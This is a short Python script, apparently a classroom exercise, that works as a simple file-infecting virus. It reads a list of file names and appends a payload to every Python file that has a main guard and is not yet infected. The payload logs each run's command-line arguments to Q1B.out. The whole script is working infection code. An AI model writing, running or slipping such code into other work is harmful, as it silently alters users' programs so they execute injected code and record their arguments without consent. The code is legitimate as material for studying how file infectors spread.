import sys
import re
from Q1A import driver

payload = [
        "\n",
        "import sys\n",
        "def log_command_line():\n",
        "    with open('Q1B.out', 'a') as log_file:\n",
        "        log_file.write(' '.join(sys.argv) + '\\n')\n",
        "log_command_line()\n"
    ]

def file_check(file_name):
    if file_name == '__pycache__': pass
    else:
        with open(file_name, 'r', encoding= 'utf-8') as file: contents = file.read()
        if 'if __name__ == "__main__":' in contents: check_one = True
        else: check_one = False
        counter = 0
        if check_one == True:
            for text in payload:
                if text not in contents: counter += 1
                else: pass
            if counter == 5: check_two = True
            else: check_two = False
            if check_one == True and check_two == True:
                with open(file_name, 'a') as file: 
                    for line in payload: file.write(line)
            else: return "Check One and Check Two not both True, Exiting..."


driver()
with open("FileNames.txt", 'r') as file:
        for line in file:
            stripped_line = re.sub('\n', '', line)
            file_check(stripped_line)
